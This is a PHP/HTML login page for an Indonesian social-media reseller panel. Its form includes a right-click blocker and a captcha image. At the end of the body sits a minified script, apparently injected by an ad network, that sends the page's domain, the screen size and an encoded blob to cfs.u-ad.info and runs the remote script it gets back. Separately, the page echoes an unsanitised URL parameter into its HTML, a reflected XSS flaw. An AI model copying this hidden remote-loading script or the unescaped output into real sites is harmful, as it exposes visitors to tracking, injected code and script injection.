<?php
// Script by Anvield Wijaya

session_start();
if(isset($_SESSION['username'])) {
header('location:/'); }
require_once("koneksi.php");
?>

<!doctype html>
<html>


<head>
        <meta charset="utf-8">
        <title>Login User ID</title>
        <link href="example.css" media="all" rel="stylesheet" type="text/css" />
<!-- Meta -->
<meta name="description" content="CS-Panel SMM Panel">
<meta name="keywords" content="SMM Panel,Central-Store,Webpanel,Social Medi Reseller">
<meta name="author" content="Anvield Wijaya">
<!-- / Meta -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>
  <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>
</head>
    
    <body>

<script language=JavaScript>
<!--

//Disable right mouse click Script
//By Maximus (maximus@nsimail.com) w/ mods by DynamicDrive
//For full source code, visit http://www.dynamicdrive.com

var message="Function Disabled!";

///////////////////////////////////
function clickIE4(){
if (event.button==2){
alert(message);
return false;
}
}

function clickNS4(e){
if (document.layers||document.getElementById&&!document.all){
if (e.which==2||e.which==3){
alert(message);
return false;
}
}
}

if (document.layers){
document.captureEvents(Event.MOUSEDOWN);
document.onmousedown=clickNS4;
}
else if (document.all&&!document.getElementById){
document.onmousedown=clickIE4;
}

document.oncontextmenu=new Function("alert(message);return false")

// -->
</script>
        <h1>Login User ID</h1>
        <section>
               <h2>Register ? <input type="button" value="Daftar Gratis" onclick="window.location.href='register.php'" /></h2>
<?PHP
	if (isset($_SERVER['HTTP_REFERER'])){
	if (isset($_GET['pesan'])){
	$pesan = $_GET['pesan'];
	$isi = $_GET['isi'];
	if ($pesan == 1){
	echo "
	<div class='alert alert-danger'>
	<a class='close' data-dismiss='alert'>Ãƒâ€”</a>
	<strong>Gagal!</strong> $isi.
	</div>
	";
	}
	}
	}
	?>
    <script>
function validateForm() {
    var x = document.forms["myForm"]["fcaptcha_code"].value;
    if (x == null || x == "") {
        alert("Captcha Wrong !");
        return false;
    }
}
</script>
            <center><form role="form" action="actlogin.php" method="post" id="register_form" class="intro-form">
                                <h3 class="text-center"> Login User ID </h3>
                                <div class="form-group"><label>Username :</label>
                                    <input type="text" name="username" class="form-control" placeholder="Username" required="required">
                                </div>
                              
                                
                                <div class="form-group"><label>Password :</label>
                                    <input type="password" name="password" class="form-control" placeholder="Password" required="required">
                                </div>

<div class="form-group">
<label>Verification Code:</label>
<center><img src="http://envato.bouanane.com/PHP/Captcha/captcha_image.php"></center>
                                    <input type="text" name="captcha_code" class="form-control" placeholder="Masukkan Captcha" required="required">
                                </div>
                                <div class="form-group text-center">
                                    <button type="submit" class="btn btn-default">Login Here !</button>
                                </div>
                            </form>
                </center>
        </section>
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpnsBYD%2bkSCuKr4YBUlZm9INJegrooRM1Rluy8g5vwgZLezu3sBoNRzRJu1XmqZnks4dw%2bazJtsWTAjd0w16Yt%2bf3i9ta8t5Q%2fTn0D%2fhL%2bQfF9mEmRxVP3B1S40pE4Fa2URPVajqjyWqmOEYuCv9U%2fInGChA5XIG3ng%2fd3B36AVT0RT6EkZIFUlBt1egtE7kyHWH9fOsoWsPTzi3M4mzP06nRAqrXJ1jOxt0fUIELlIlm6A3%2fk9fEh%2bAK8IDhtYKCuhWCcmBMxdVZwN6pASqyWKbuLQP%2b5pVoCfJtcA1Q51haL0FktjCFsLfY9VBO8T8%2fDuTEJEvI%2brrqbtQUs0wMaHLqnJhN61dqw%2bfwWCpF5f0JACv%2ffOGm5H%2f1vZ47zL0Wkf5MRQTvIXQWFjEEng3cp%2fU185Zjqw3iNjZEMTq0Ct0aBZBPatll3%2bqVvj3wp9JHNAJgVwP3bgG2ww2tGyMY5Xozz19Xj8VVV7LXbDMdZLAWCJDM5JRCs4Ejd7QXnIQiIW" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


</html>
